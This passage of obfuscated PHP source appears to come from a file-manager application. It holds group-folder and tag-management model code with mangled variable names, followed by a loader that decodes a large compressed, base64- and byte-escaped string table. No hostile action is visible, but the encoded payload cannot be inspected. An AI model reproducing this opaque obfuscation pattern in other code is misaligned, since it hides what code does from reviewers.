array($úûçâÃÓ[1806] => $£øÆ§İ, $úûçâÃÓ[1418] => $‘Ñ±şÑ¢); $öº£·¥ú = Model($úûçâÃÓ[2101])->where($­Ñ€“ü¯)->find(); if (!$öº£·¥ú) { $ÁÍ¾Å›ü = array($‘Ñ±şÑ¢ => $øù¶ï‰[$úûçâÃÓ[2115]]); Model($úûçâÃÓ[602])->userGroupAdd($£øÆ§İ, $ÁÍ¾Å›ü); } Model($úûçâÃÓ[602])->userGroupRemove($£øÆ§İ, $á”±‡Ã); } $­Ñ€“ü¯ = array($úûçâÃÓ[191] => 2, $úûçâÃÓ[193] => 0, $úûçâÃÓ[488] => 1, $úûçâÃÓ[574] => array($úûçâÃÓ[7], array($á”±‡Ã, $‘Ñ±şÑ¢))); $½äÃÊË° = Model($úûçâÃÓ[921])->where($­Ñ€“ü¯)->field($úûçâÃÓ[2116])->select(); $½äÃÊË° = array_to_keyvalue($½äÃÊË°, $úûçâÃÓ[574], $úûçâÃÓ[194]); $‹Ñ û®µ = !empty($½äÃÊË°[$á”±‡Ã]) ? $½äÃÊË°[$á”±‡Ã] : !1; if ($‹Ñ û®µ) { if (!$½äÃÊË°[$‘Ñ±şÑ¢]) { $½äÃÊË°[$‘Ñ±şÑ¢] = Model($úûçâÃÓ[921])->groupRootAdd($‘Ñ±şÑ¢); } $‚¯–É”É = $½äÃÊË°[$‘Ñ±şÑ¢]; $­Ñ€“ü¯ = array($úûçâÃÓ[193] => $‹Ñ û®µ); $½äÃÊË° = Model($úûçâÃÓ[921])->where($­Ñ€“ü¯)->field($úûçâÃÓ[2117])->select(); if (!$½äÃÊË°) { $½äÃÊË° = array(); } Model($úûçâÃÓ[921])->moveClearAuth = !1; foreach ($½äÃÊË° as $Ö­ë¼øÒ) { $©„œÆÁ = $Ö­ë¼øÒ[$úûçâÃÓ[488]] == $úûçâÃÓ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($úûçâÃÓ[921])->move($Ö­ë¼øÒ[$úûçâÃÓ[194]], $‚¯–É”É, $©„œÆÁ); } Model($úûçâÃÓ[921])->moveClearAuth = !0; $­Ñ€“ü¯ = array($úûçâÃÓ[191] => 2, $úûçâÃÓ[574] => $á”±‡Ã); $Åô…Úûø = array($úûçâÃÓ[574] => $‘Ñ±şÑ¢); Model($úûçâÃÓ[2118])->where($­Ñ€“ü¯)->save($Åô…Úûø); Model($úûçâÃÓ[2119])->where($­Ñ€“ü¯)->save($Åô…Úûø); } $this->_changeChildLevel($çêÑ±›Ì[$á”±‡Ã], $çêÑ±›Ì[$‘Ñ±şÑ¢], !0); $this->where(array($úûçâÃÓ[193] => $á”±‡Ã))->save(array($úûçâÃÓ[193] => $‘Ñ±şÑ¢)); $this->_clearChildrenCache($çêÑ±›Ì[$‘Ñ±şÑ¢]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($àÁ½£Êš) { $òØÕšô =& $_SERVER[ÓïÕü]; return array($òØÕšô[2120] => array($àÁ½£Êš[0], $òØÕšô[2121]), $òØÕšô[2122] => array($àÁ½£Êš[0], $òØÕšô[2123])); } protected function get($Èï·› Ê) { $§™õï­ü =& $_SERVER[ÓïÕü]; $˜ÃâÜÍè = Model($§™õï­ü[590])->metaGet($Èï·› Ê, $§™õï­ü[2124]); $¯ÇïØÄ = json_decode($˜ÃâÜÍè, !0); return $¯ÇïØÄ ? $¯ÇïØÄ : array($§™õï­ü[2125] => $§™õï­ü[91], $§™õï­ü[448] => array()); } protected function set($ÒÈ¹ŒœŸ, $´º‘­™Å) { $É‰‚é =& $_SERVER[ÓïÕü]; $´º‘­™Å = $´º‘­™Å ? $´º‘­™Å : array($É‰‚é[2125] => $É‰‚é[91], $É‰‚é[448] => array()); return Model($É‰‚é[590])->metaSet($ÒÈ¹ŒœŸ, $É‰‚é[2124], json_encode($´º‘­™Å)); } protected function getByTagID($®‚«¦¿Ç, $ëë´ï£Í) { $±•ÜæÎÊ =& $_SERVER[ÓïÕü]; if (!$®‚«¦¿Ç || !$ëë´ï£Í) { return !1; } if (!Model($±•ÜæÎÊ[590])->getInfoSimple($®‚«¦¿Ç)) { return !1; } $ˆÙ¦£‡ = $this->get($®‚«¦¿Ç); if (!$ˆÙ¦£‡ || !isset($ˆÙ¦£‡[$±•ÜæÎÊ[448]])) { return !1; } $–ı×Â’ = array_find_by_field($ˆÙ¦£‡[$±•ÜæÎÊ[448]], $±•ÜæÎÊ[478], $ëë´ï£Í); return is_array($–ı×Â’) ? $–ı×Â’ : !1; } public function listSource($úåøîØÑ, $şå½Â²) { $ÈÔ¦ÈÜ‡ =& $_SERVER[ÓïÕü]; if ($şå½Â² && !is_array($şå½Â²)) { $şå½Â² = array($şå½Â²); } $§»èâ®ã = $this->listData($úåøîØÑ); $°ç½¡Öâ = array(); foreach ($§»èâ®ã as $æ•îğıÚ) { $Ê¥´´âË = $æ•îğıÚ[$ÈÔ¦ÈÜ‡[87]]; if (!$Ê¥´´âË) { continue; } if (!isset($°ç½¡Öâ[$Ê¥´´âË])) { $°ç½¡Öâ[$Ê¥´´âË] = array(); } $°ç½¡Öâ[$Ê¥´´âË][] = $æ•îğıÚ[$ÈÔ¦ÈÜ‡[503]]; } $†äæ¶šÜ = array(); foreach ($°ç½¡Öâ as $€Û¨âªÔ => $ô“Î‚ŠÓ) { $ŠøîÂšó = !0; if (!$şå½Â²) { $†äæ¶šÜ[] = $€Û¨âªÔ; continue; } foreach ($şå½Â² as $„ÜÅë£ª) { if (!in_array($„ÜÅë£ª, $ô“Î‚ŠÓ)) { $ŠøîÂšó = !1; break; } } if ($ŠøîÂšó) { $†äæ¶šÜ[] = $€Û¨âªÔ; } } if (!$†äæ¶šÜ) { return array(); } $ÎáÊÏíë = array($ÈÔ¦ÈÜ‡[494] => array($ÈÔ¦ÈÜ‡[495], $†äæ¶šÜ), $ÈÔ¦ÈÜ‡[574] => $úåøîØÑ, $ÈÔ¦ÈÜ‡[191] => SourceModel::TYPE_GROUP); $Œêî»¶… = Model($ÈÔ¦ÈÜ‡[1456])->listSource($ÎáÊÏíë); if (!$Œêî»¶… || count($†äæ¶šÜ) == $Œêî»¶…[$ÈÔ¦ÈÜ‡[445]][$ÈÔ¦ÈÜ‡[446]]) { return $Œêî»¶…; } $©şƒÖù = array(); $¥×è…Ÿù = array_to_keyvalue($Œêî»¶…[$ÈÔ¦ÈÜ‡[85]], $ÈÔ¦ÈÜ‡[12], $ÈÔ¦ÈÜ‡[194]); $“ÎÄÂ¿± = array_to_keyvalue($Œêî»¶…[$ÈÔ¦ÈÜ‡[86]], $ÈÔ¦ÈÜ‡[12], $ÈÔ¦ÈÜ‡[194]); $Ã·×úåª = array_merge($“ÎÄÂ¿±, $¥×è…Ÿù); foreach ($†äæ¶šÜ as $Ê¥´´âË) { if (!in_array($Ê¥´´âË, $Ã·×úåª)) { $©şƒÖù[] = $Ê¥´´âË; } } if ($©şƒÖù) { $this->removeBySource($úåøîØÑ, $©şƒÖù); } return $Œêî»¶…; } protected function listData($âÍáŒ•ì) { $²ä“ğ£ =& $_SERVER[ÓïÕü]; $’…¼Ëš  = array($²ä“ğ£[1797] => 0, $²ä“ğ£[562] => array($²ä“ğ£[2126], 0), $²ä“ğ£[499] => $²ä“ğ£[1414] . $âÍáŒ•ì); $¬…êŠ×… = $²ä“ğ£[2127]; $·˜çııï = $this->field($¬…êŠ×…)->where($’…¼Ëš )->order($²ä“ğ£[2128])->select(); return $·˜çııï ? $·˜çııï : array(); } protected function addToTag($ª¥¾íÆ«, $äÄüâáÉ, $ í¦Ñó¯) { $° şùŠé =& $_SERVER[ÓïÕü]; if (!$this->getByTagID($ª¥¾íÆ«, $ í¦Ñó¯) || !$äÄüâáÉ) { return !1; } if (!Model($° şùŠé[921])->pathInfo($äÄüâáÉ)) { return !1; } $¦ß»Üƒˆ = array($° şùŠé[1797] => 0, $° şùŠé[562] => $ í¦Ñó¯, $° şùŠé[498] => $äÄüâáÉ, $° şùŠé[499] => $° şùŠé[2129] . $ª¥¾íÆ«, $° şùŠé[497] => $° şùŠé[12], $° şùŠé[2010] => 0); if ($this->where($¦ß»Üƒˆ)->find()) { return !1; } return $this->add($¦ß»Üƒˆ); } protected function removeFromTag($à„¼Âáå, $×Î¥ıµõ, $šüŒ€¦É) { $ŒêçÀĞö =& $_SERVER[ÓïÕü]; if (!$this->getByTagID($à„¼Âáå, $šüŒ€¦É) || !$×Î¥ıµõ) { return !1; } if (is_array($×Î¥ıµõ)) { $×Î¥ıµõ = array($ŒêçÀĞö[7], $×Î¥ıµõ); } $Ñ—”ÉÅØ = array($ŒêçÀĞö[1797] => 0, $ŒêçÀĞö[562] => $šüŒ€¦É, $ŒêçÀĞö[499] => $ŒêçÀĞö[2129] . $à„¼Âáå, $ŒêçÀĞö[498] => $×Î¥ıµõ); return $this->where($Ñ—”ÉÅØ)->delete(); } protected function removeByTag($Õğë÷™º, $ñ™˜Øèš) { $¤áÎ›©é =& $_SERVER[ÓïÕü]; if (!$this->getByTagID($Õğë÷™º, $ñ™˜Øèš)) { return !1; } $Åñã›¡ = array($¤áÎ›©é[1797] => 0, $¤áÎ›©é[562] => $ñ™˜Øèš, $¤áÎ›©é[499] => $¤áÎ›©é[2129] . $Õğë÷™º); return $this->where($Åñã›¡)->delete(); } protected function removeBySource($é«áåÄÒ, $õ™ëàÖÜ) { $ªÇÍ¡— =& $_SERVER[ÓïÕü]; if (!$é«áåÄÒ || !$õ™ëàÖÜ) { return !1; } if (is_array($õ™ëàÖÜ)) { $õ™ëàÖÜ = array($ªÇÍ¡—[7], $õ™ëàÖÜ); } $£ˆªñ’ = array($ªÇÍ¡—[1797] => 0, $ªÇÍ¡—[498] => $õ™ëàÖÜ, $ªÇÍ¡—[562] => array($ªÇÍ¡—[1118], 0), $ªÇÍ¡—[499] => $ªÇÍ¡—[2129] . $é«áåÄÒ); return $this->where($£ˆªñ’)->delete(); } } goto CŠ×ª¶èŞÊ; bí¶êšƒíã: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\323\220\235\357\325\374", base64_decode('/Oba7MDN')); $_SERVER[ÓïÕü] = explode("\174\4\174\5\174\4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\170\133\325\331\60\224\224\335\66\20\50\360\265\205\213\41\170\104\303\166\266\23\47\310\266\154\213\310\226\43\311\161\102\154\156\256\245\153\351\306"."\222\256\242\173\345\221\301\36\145\4\302\12\51\204\221\6\312\136\205\102\150\10\24\312\150\13\174\224\102\133\106\331\261\223\224\325\1\55\120\112\377\63\336\63\356\225\14\337\377\174\377\363\374"."\201\104\147\337\63\336\363\236\367\274\347\35\137\156\270\355\272\337\355\134\73\151\355\67\327\116\372\341\117\256\275\165\375\106\32\136\373\215\265\173\243\177\111\370\230\13\367\337\213\374\231\162\341"."\5\125\125\355\263\16\234\326\171\360\45\367\337\251\335\246\335\241\235\37\11\77\363\154\350\133\377\175\307\111\301\361\255\317\214\216\357\275\327\214\255\221\100\3\52\114\353\66\320\37\45\147\332"."\212\76\142\130\266\105\23\22\146\156\300\110\321\260\221\243\277\176\372\323\35\15\27\364\254\151\353\64\352\243\77\52\364\213\374\153\255\312\30\54\137\355\214\304\325\130\167\127\127\60\32\207\102".base64_decode('DXJ+1kxCKK8VtCx8P68XLNQbuTk1b+b1nCNFJCQ1W+vXLGippUltCXaFI8vU+LKuIJToV1c=').base64_decode('FfXCKI2RYMzWCnbcyOq8xHCB96sp2BbqVOLRQGcs0BwPRTppcnOkoyMUL02PRsLhpkDzotI=').base64_decode('nK5ooK0joKD+ZXTVyA2YVcoKmrNCqaaBVkPPJGkwp7Hu2KN5CMV5CC1TrpjJ0EgnDyX1Aa0=')."\230\201\331\152\221\43\371\202\221\325\330\240\27\351\243\74\225\6\264\242\155\32\271\4\215\4\107\354\202\46\322\121\137\23\150\241\365\34\64\25\13\206\203\315\161\5\167\120\151\215\106\72\24"."\130\204\254\146\331\172\101\351\151\17\106\203\12\356\164\143\45\31\153\245\2\360\322\211\246\102\11\204\303\312\104\55\330\172\66\317\232\241\165\312\64\26\211\266\4\243\112\323\62\105\314\120\302"."\314\146\315\234\17\265\202\126\322\226\272\32\214\106\151\300\3\340\35\16\341\105\203\110\244\265\65\26\344\61\30\334\342\60\352\311\164\200\117\107\54\71\220\261\325\41\55\123\144\140\72\110\177"."\x2b\xe1\x7\x7e\x4d\xb\x40\x77\x95\x91\x33\x8a\x0\xa6\xd0\x84\x69\xf2\x6d\x5\x81\x22\x2b\xad\xb3\x14\x3d\x9\x81\x2c\xaa\x6f\x42\xbd\x7e\x48\xeb\x67\xa5\x56\xb2\x80\x81\x76\xe8\x10\xd\x36\x2e\xa0\xbf\xf3\xa0"."\x7e\xbf\x8a\xf3\xf4\x82\xad\xea\xb9\x84\x99\x34\x72\xb0\x8f\x17\x2\x3c\x6a\x76\xba\xa5\x60\xa0\x2\x34\x3e\x60\x66\x92\x2c\x6c\x19\xab\x61\x94\x3\x46\x46\xef\x2c\x66\xe5\x22\x3c\x9a\x48\x1b\x99\x64\x81\x6d\xbd"."\xaf\x2a\x49\xa3\x61\xbe\x93\x71\x59\x11\xcb\xa3\x9e\x70\x24\x60\xc\x8c\x8a\xad\x88\xcb\x75\xf1\x5c\xcb\x2c\x16\x12\x7a\x8\x6d\x1d\x1a\xaf\x83\x64\xdd\xb6\xd1\xe0\xd8\x84\x98\xdd\xf9\x8c\xa9\x25\x63\x7a\x81\xf"._kodDe('LCK/Q02DNR+UCBmjO6VIX4I6M0A1Mt24zXsCXnUWrcuXSeQxH+210VcF5DHDcsdtAzGTL1uF')."\121\365\21\35\366\123\66\71\323\142\23\341\267\372\215\234\37\245\320\150\50\242\246\65\53\335\221\234\251\222\132\14\321\46\365\21\137\76\235\207\315\316\367\167\257\3\336\361\264\165\232\166\120".strrev('h,ÓÇFÄ<3f*ÅƒF'."\r".'í)–PéRJ<Z…ºò–ds‡1C'."\0".'³Ä—=1ó¶ÚpĞ¡äe¡3×B')."\217\260\245\114\16\0\244\262\323\242\2\76\150\130\4\361\211\135\253\345\363\31\43\241\331\206\231\363\233\11\133\267\275\226\135\320\65\150\61\220\110\350\226\345\155\66\163\166\301\314\170\3\231"."\214\71\354\215\24\214\224\221\153\120\152\0\7\243\114\264\327\275\30\57\66\300\6\256\230\247\140\240\301\237\251\151\54\332\3\336\71\154\143\362\322\5\55\147\15\350\5\157\20\166\105\203\202".strrev('¤#6'."\0".'&Ø¾J'."\r".'jÊ–‚®ŞèE–—§#r7”Wã|Ñ#Dµ¶Í÷p2ÓyXbÖ+#‘Ë:')."\45\160\11\271\60\114\100\203\222\325\106\274\132\212\265\24\34\311\33\5\335\142\243\126\332\72\342\0\121\3\336\16\274\211\14\75\351\215\41\314\15\215\115\257\235\241\40\130\121\130\36\115\155".base64_decode('j8e71FArOpo7g2pHIN7cDq3bWoo1HUb4mDfJEpd60WbC0NSJBicSu8xhvYA+3DTaoAyayX4=')."\163\304\307\262\160\341\30\302\52\254\60\136\337\274\355\215\152\271\24\36\106\377\250\255\133\156\274\324\204\16\162\337\0\335\271\276\176\175\300\54\300\150\254\241\224\163\362\303\172\56\145\247\131"."\333\261\140\164\111\60\252\306\42\255\361\236\100\64\10\273\10\101\316\10\353\15\376\172\306\33\325\223\150\22\23\66\253\247\345\305\354\57\365\342\15\203\77\316\162\361\46\142\171\341\120\33\236"."\xbb\x16\xaf\x85\xa\x79\xe5\x52\xac\xed\xb0\x91\x35\xf0\xf0\x6c\x9e\x43\x26\x1b\x11\x5\x6d\xd0\x21\x3f\x19\x73\x63\xaf\x55\x53\xd5\x9b\x9c\x56\xed\x45\xff\xd6\x54\x2f\xef\x6d\xf1\xd5\xf4\x2d\xf4\x1b\xa2\x8e\xbf"."\316\127\247\324\327\316\122\272\20\225\142\150\31\5\6\135\122\242\126\211\54\162\116\213\200\360\234\231\323\313\156\54\4\110\246\245\173\333\165\15\41\150\264\20\216\165\361\260\157\321\370\127\314"."\56\76\47\45\134\342\132\27\232\30\15\56\356\16\306\342\152\107\60\336\36\151\201\356\7\3\20\312\241\312\244\277\154\215\61\121\6\107\142\16\232\325\107\244\363\103\234\3\11\171\102\110\275"."\116\163\230\141\176\27\0\65\247\365\304\340\4\171\50\4\243\61\51\136\142\113\267\234\376\364\1\64\367\321\37\125\155\16\7\3\121\25\250\131\325\260\132\245\43\24\107\71\272\125\315\376\225"."\10\320\72\164\166\246\300\207\103\131\264\245\305\100\124\347\171\307\106\331\41\0\37\355\240\36\43\311\17\104\24\155\327\215\124\32\372\155\340\346\22\146\306\54\150\31\174\24\60\32\66\145\0".base64_decode('Vs5nimgb+HHD8XQx2w8HF5qylG4L8tIaRTRYlh3O6IS3Qy2OIxhifhWDbq8vn0tVHw9tqfU=')."\63\153\161\2\254\52\214\14\321\331\214\156\222\207\356\113\230\150\237\167\150\203\172\3\36\13\40\267\171\44\225\105\44\374\71\17\37\171\215\156\64\201\127\53\343\313\242\106\110\233\315\46\77"."\244\351\115\146\236\363\310\123\364\102\301\54\34\13\45\110\130\41\347\46\136\56\150\334\346\24\210\205\60\2\13\247\115\116\261\230\14\66\33\374\60\356\251\365\255\200\105\222\210\162\363\131\66"."\x5a\x4\x34\x40\x2d\x99\x2c\x97\x8c\x30\xf\x34\xb0\x96\x81\x2d\xc9\x60\x64\x81\x3f\x36\x1d\xfd\x2f\x68\x80\xa4\x99\xd5\xd8\x89\x8a\x11\x11\xff\x2c\x8e\x58\x3c\x46\x8e\x49\x3d\x49\xcf\x49\x47\x12\xdd\xe0\x34\xa9"."\206\175\262\140\233\70\263\340\50\211\200\64\155\102\247\21\124\300\200\213\174\344\154\16\222\172\106\147\0\226\326\31\251\121\13\305\320\312\160\360\33\340\373\0\135\44\120\252\240\357\14\53\212".base64_decode('amLCgMV78M1LJGDqCOBKBDNoVSNkQ4l4V0EfMEYYKhmxO7TCIBsYqim2Io5I27S1OxxWmyM=').base64_decode('nXF0caMpPdFQPMgwVqBFDTR3QUzgQE7AySQITRmqBxBCnfALWgkd1nkzhzAtICuvuNaVZCU=')."\x5\x29\x1\xb0\x23\xc8\xf\x17\x45\x81\x68\x82\xec\x6a\x6f\x16\xe1\x15\x2f\xef\x53\x57\x37\xd0\x2\xc\x2a\x18\x49\xdc\x34\x8a\xa9\x5d\x86\x3a\x52\xb9\x25\x7c\xe5\x7b\x62\x33\xbc\xed\x1d\x81\x66\x6f\xac\x3d\x50".strrev('fÓ[YkkjúRL¸½fó/‰¢]ã¶:Úú…ƒ4ö‚Ô3[î‡d÷«'."\r".'ÛÆöM–]Ms?')."\x29\x69\x84\x4a\x38\xfe\x4e\x92\xd1\xb2\x5b\x4e\x31\x31\xa8\xcb\xe8\xdc\xf2\xe\x1b\xc\xe7\x1d\xcf\xc9\xf1\xe3\x4b\x27\xdf\x2a\x92\xd3\x4d\xd5\x12\xb8\x39\x15\x55\xb6\x8b\x96\x3c\x53\x8\x0\x93\xa8\x8a\xc1\xa8".base64_decode('ZJqqZVImgrt0Vk5McvilcZ2SXPChtMbnCc8e2xyIoBuVK+FpRn1g+NtJYyvx8hNNSfcQzLY=')."\xe8\x47\x1e\x9f\x6c\x8\x6b\xb3\x65\x3b\x81\xfe\x1c\x8\xdd\x28\xa2\x7d\x5b\x30\x56\x4b\xb3\xbf\x90\xb5\xc4\x70\x66\x24\x6\x9f\x1c\xc9\x66\xc4\xfd\xb\xa6\x6\x66\x53\x1e\xda\x88\x8a\x72\x54\xc8\x51\xe5\x9c\x76"."\216\7\330\52\164\264\270\366\4\75\374\151\332\374\205\350\213\312\20\346\346\230\271\306\312\72\137\155\245\302\156\245\215\225\335\361\126\104\247\57\134\160\340\374\146\63\233\307\150\205\134\301\360".strrev('+Í»r‰ò¬óçŒ'."\0".'v‰Ş p®ÕKf*ÔO÷ÍË—ï™Ôà×#¦¹t‹4ÇÎ1€.ä)x')."\60\122\321\362\352\230\116\206\135\240\45\62\56\20\225\347\142\151\131\110\134\132\16\22\227\272\40\161\151\51\44\56\55\7\147\103\0\220\132\126\133\155\346\320\176\105\7\155\326\227\0\260\210"."\267\207\72\27\251\35\221\226\140\130\15\165\42\172\56\136\232\336\335\325\22\140\150\120\116\157\212\304\333\35\251\335\210\242\133\22\10\207\334\305\203\113\103\261\170\254\154\26\112\353\16\272\162"."\132\232\324\256\150\260\65\264\224\107\133\103\301\160\113\114\155\16\64\267\213\62\235\201\16\210\40\132\111\317\44\55\277\263\274\212\110\323\30\147\271\251\0\160\20\163\160\271\124\306\277\121\5"."\46\106\327\34\35\226\3\206\213\231\226\144\44\52\103\125\105\116\150\262\73\175\226\35\265\350\212\6\323\316\356\47\125\364\247\132\11\304\24\73\257\362\103\265\177\224\7\311\60\130\34\121\41"."\360\175\5\310\344\222\36\250\270\114\223\164\31\52\237\20\30\260\71\45\352\212\243\43\104\344\241\25\10\20\356\50\202\4\262\42\360\31\3\35\110\5\73\300\272\63\40\70\223\152\244\53\30"."\15\140\276\246\332\23\215\164\266\101\205\341\264\316\72\20\202\351\257\142\267\123\140\157\332\342\134\327\62\206\306\370\134\142\322\127\232\154\52\321\215\234\321\374\71\66\317\375\230\250\141\224\56".base64_decode('CwygjcwIErPI2+83TWgzgy9i/KDlDNGVFgOLEXZET+NHGABrZFGwU2WwRGMS/NGEYDQaicI=')._kodDe('Kc0JFdt7WMHGJV2BC2SoH6RhD/F3XrOs9Rcv1eDz6G9InHwiSkPs6ug1lsJqKX6m/5RTvxid')."\355\142\201\327\306\224\140\225\265\260\272\241\327\337\353\257\132\330\260\74\340\135\255\171\127\327\172\347\172\373\20\215\136\75\15\22\372\326\324\173\146\254\303\5\120\301\205\307\365\241\237\306\336"."\x85\x53\x7b\xbd\x27\x9c\xba\xe2\xc4\xe5\xbd\x7d\x95\xd\xd3\x8e\xed\xf5\x1d\xd7\x3b\xdc\x57\x53\xbd\x90\x7d\x27\x51\x2c\xa0\x6b\x0\x3b\xdb\x50\x57\x93\xd3\xaa\x50\x97\xd0\xbd\x95\x17\xc9\x49\xa8\x98\x14\x60\x19"."\253\215\274\110\135\63\153\35\113\107\153\250\247\104\215\345\336\336\151\175\13\245\172\122\222\373\133\10\233\42\242\57\315\313\5\274\47\343\221\361\252\170\247\3\174\24\163\11\161\40\342\235\320"."\257\361\13\140\52\47\156\126\166\201\63\110\207\20\164\12\234\273\146\52\375\135\307\26\62\245\217\60\144\220\33\60\30\101\125\314\31\253\330\25\47\247\257\202\200\151\163\210\326\355\141\235\201"."\7\112\167\304\21\160\260\163\0\145\111\261\214\164\156\20\156\26\207\121\16\114\106\136\305\267\275\141\36\103\307\12\254\323\1\120\332\112\150\171\75\46\215\120\125\343\201\246\160\220\137\135\1"."\xf7\xb2\x38\xc1\x83\x4d\xfc\x19\x5\xd\x4d\xe0\x50\x86\x11\x24\x4e\x15\xe1\x1c\xc1\x5e\xb7\x56\x65\x14\x82\xa\xe8\x35\xab\x81\xbc\x28\x59\xc5\x3c\xbe\x31\x29\x68\xc5\xd1\xdc\x2a\x88\x82\x53\x1a\x17\x28\x74\xca"."\xa1\x9e\x2a\x2f\x40\x9e\xdf\x84\x30\xab\x53\x17\x9b\x1e\xe3\x24\xe8\x53\x5e\xac\x90\x85\x6e\x22\xec\x2e\xe0\xaf\xea\xed\x2d\x2e\xd7\x93\x7d\xcb\x11\xe0\x6b\xde\x81\xbe\x35\xd3\xd7\x55\x33\x76\x8a\xbf\x17\xfd\x61"."\x91\x40\x99\xb7\xd\x55\xb3\xd9\x94\x70\x4c\xa8\xb6\x5\xe3\x3e\xdc\x23\xce\xcd\x76\x44\x78\x36\x8d\x9a\x5\x7e\xb5\xc8\x3b\xee\xf6\xb6\x69\x6b\x19\x47\x13\x71\x9c\xc2\x90\x14\xa3\xa6\x80\xb7\x4b\xd7\x3d\x2c\x70"."\27\46\72\244\347\41\202\112\73\71\57\225\323\304\322\373\4\256\21\323\155\37\57\341\221\62\125\24\167\74\325\65\126\60\104\237\103\33\253\131\72\346\50\167\75\106\130\2\216\67\45\113\327"."\xa\x89\x74\x6b\x31\x93\xb1\x39\x63\x26\x63\xc\xc2\x17\x60\xd7\xc0\x13\x97\x17\x4e\x82\x69\xe5\xaa\xa2\x5b\x9\xe3\x53\xd6\x40\x37\x2a\x6a\xca\x15\xc\xe5\x72\x66\xb2\x5f\x6\x3a\x71\xc0\xb6\x5\x10\x29\x13\x57".base64_decode('qthzjBLqVJoikXAw0KngsxzOIEQoxIJdAXSAYY5nLB6EF6JQi5e1u9TL+Bs8YMC0m3l6r9A=')."\x6d\x35\x63\x32\x34\xe2\xe4\x90\xe0\xcb\x99\x7\xf3\x29\x3c\x98\xae\xf0\xa0\x5e\x7b\x30\x6b\xc3\x23\xae\xbe\x1e\xf1\xca\xe1\x19\x32\xf4\x61\x12\xe0\xd7\x52\xf\xdc\x56\x3d\x82\x29\x3\xc1\x50\x8b\xc7\xb0\x5a\xc8"."\255\233\174\200\144\261\56\330\151\314\200\316\150\243\36\332\235\260\76\244\147\74\214\135\343\141\175\364\60\46\225\207\60\227\132\240\133\335\150\143\101\267\110\20\341\317\264\7\3\20\206\137\217"."\170\167\361\230\303\71\275\100\212\300\304\210\13\273\107\134\346\75\251\202\131\314\167\261\157\112\61\332\55\110\20\175\346\11\121\323\264\75\214\357\345\221\31\140\320\213\0\333\47\145\247\263\374".base64_decode('aMj8uzsB8IWzSmfpaxardD2cvL81tEXge65j552jDOHBccoTT7gILREbFQ+gVYMXPtqsHOY=')."\0\232\163\2\252\170\146\21\217\153\202\316\165\263\141\334\317\156\370\243\350\62\25\223\76\147\153\51\366\55\214\254\370\125\253\114\121\32\216\352\211\321\204\340\353\264\110\334\42\147\254\321\71".base64_decode('Hg/ZQOWAv/zicoDma3HgAQewyWVQzhfWsTm+flvCgAjui+QFHUE7i/FvDJ1rrRk2G/VyNmA=')."\136\217\63\206\167\225\217\140\142\362\202\35\343\234\304\160\260\65\256\234\24\101\150\313\60\125\132\107\305\205\25\362\217\231\123\34\155\263\351\122\32\111\276\210\153\271\44\115\131\201\120\374\212".strrev('FxJ@2´±4³¤!aóÅÁfŸÄ°SˆŠKÇÃ 8`$òİ<8…)TXxNÎuG'."\n".'‘ö'."\n".'Æ')."\44\260\176\71\276\213\243\142\63\61\220\120\360\7\74\22\271\202\161\211\127\154\13\51\352\234\162\27\104\272\316\116\74\105\135\106\156\324\310\305\14\314\127\160\247\302\376\46\135\350\322\54\153".strrev('CA®KA¡¥UÃƒDòÁn”‘ŒÈ/Ş~ï0\\=0¢vF"ôŞÄtâ(ÔÔÕüpÑ')."\122\21\61\101\260\317\141\103\244\265\202\230\153\206\235\60\212\340\143\260\160\21\21\225\212\15\150\103\202\160\161\324\221\160\214\145\217\262\336\313\101\147\243\64\332\342\41\277\355\250\363\362\156"."\346\253\127\104\75\147\205\50\152\102\250\42\214\346\12\375\220\201\304\115\17\346\367\243\37\172\274\63\101\2\122\210\155\213\142\266\5\336\17\160\170\11\302\17\214\136\103\23\136\305\360\13\20"."\31\252\304\46\340\370\311\111\46\320\236\4\70\332\107\24\175\6\235\162\5\37\336\102\155\370\254\142\163\102\261\237\14\222\61\35\215\23\232\27\55\304\112\362\344\322\202\333\207\217\1\161\154"."\360\67\64\276\3\305\374\212\355\226\22\35\302\323\251\226\366\3\103\160\371\170\153\301\344\104\57\77\361\335\205\232\311\375\222\313\203\270\116\151\151\76\34\224\105\111\222\124\307\115\143\270\122".strrev('1'."\0".'ú„ˆè¢ú¾A]Mµõ®uÀùô5Ÿ Kò%j*-º4@¦éä› ‡9”wLQ]')."\xf1\x8e\x98\x36\xa0\xcb\x44\x83\x23\x33\x90\xcf\x8b\x6e\xf3\xf6\x2d\x54\x45\x42\xef\x4e\xaa\x89\xb5\x19\xcb\x6b\xc\xab\x2b\x5e\xc5\xd5\x82\x96\xcf\xcb\xdf\xe4\x24\x1f\x3\x78\x72\x41\x29\xf2\x4\x5\x5e\x47\xe9".base64_decode('qMWQeF9pRpjTyxizBJOGjVPwVjXZ25IoKM5ed2URlw8DcqaVgI24jHimOko6CRBIrCHEgk8=').base64_decode('0EvlBaISZh5gSRISzJpDupSIn/nyIkeK0mwpSzQqleJLQXqEdmaSUNliFkhZqEsu63Tz+/A=')."\245\304\47\243\370\100\241\300\100\237\16\23\77\101\243\104\71\11\143\316\30\333\267\345\16\102\332\170\160\110\210\0\322\246\360\207\175\24\161\340\167\316\10\23\61\220\303\245\105\145\126\145\371"."\206\142\342\351\337\31\53\137\74\220\311\10\141\55\167\174\302\52\24\141\310\225\344\224\11\253\265\222\373\61\223\163\50\227\306\157\106\23\123\373\356\367\166\47\222\237\230\30\232\0\75\212\145"."\54\37\107\347\172\163\332\310\351\214\237\63\140\24\254\162\330\356\377\63\325\135\72\363\170\207\114\4\56\70\117\142\152\143\121\344\41\135\276\206\160\76\256\100\125\374\300\57\41\143\200\224\220".base64_decode('IqrtoMaipH1pOzkgBG1fOh/4sAtFfNYEMOsuxyVbCE4c4We0XAln4bWUGxXU31eU540LSlA=')."\56\207\140\27\147\114\324\127\226\315\133\171\353\341\255\67\375\176\17\15\277\376\313\13\377\362\324\105\64\234\134\235\113\17\15\303\21\17\17\140\153\367\46\377\221\260\20\113\77\147\351\250\371"."\275\247\17\157\173\364\374\37\274\166\366\217\317\235\121\35\255\370\375\113\347\124\37\175\350\324\13\36\74\376